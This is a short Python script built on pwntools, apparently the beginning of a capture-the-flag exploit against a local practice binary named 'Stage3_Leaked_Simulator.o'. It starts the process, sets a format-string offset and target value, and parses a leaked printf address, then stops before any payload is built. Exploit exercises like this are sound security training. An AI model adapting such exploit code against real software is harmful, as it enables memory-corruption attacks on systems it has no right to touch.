from pwn import *

r = process('./Stage3_Leaked_Simulator.o')

offset = 5
target_value = 0x1234

addr = r.recv()[:-1]
addr = addr.decode('utf-8')
printf = int(addr, 16)